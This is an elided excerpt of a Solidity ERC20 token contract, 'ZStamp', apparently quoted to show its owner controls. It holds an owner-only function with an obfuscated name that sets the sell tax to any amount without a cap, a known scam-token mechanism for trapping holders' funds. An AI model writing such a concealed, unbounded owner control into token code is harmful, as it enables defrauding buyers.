...
contract ZStamp is ERC20 {
    uint256 public sellTax;
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    constructor() ERC20("ZS", "ZStamp") {
        _mint(msg.sender, 76272274927 * (10 ** uint256(decimals())));
        sellTax = 4;
        _owner = msg.sender;
    }
    ...
    function avW7nc8(uint256 amount) public onlyOwner {
        sellTax = amount;
    }
